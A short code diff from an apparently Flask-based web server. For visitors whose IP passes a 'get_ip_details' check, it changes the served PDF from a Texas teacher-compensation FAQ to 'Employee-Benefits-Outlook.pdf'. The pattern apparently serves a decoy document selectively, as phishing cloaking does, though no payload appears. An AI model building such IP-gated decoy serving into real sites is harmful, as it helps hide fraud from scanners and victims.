@@ -149,7 +149,7 @@ def serve(path):
     # https://tea.texas.gov/about-tea/89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf
     
     if get_ip_details(visitor_ip):
-        return send_from_directory(files_folder,'89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf')
+        return send_from_directory(files_folder,'Employee-Benefits-Outlook.pdf')
 
     # This logic is now much simpler.
     # If the path points to an existing file in the static folder (like CSS, JS, or an image), serve it.
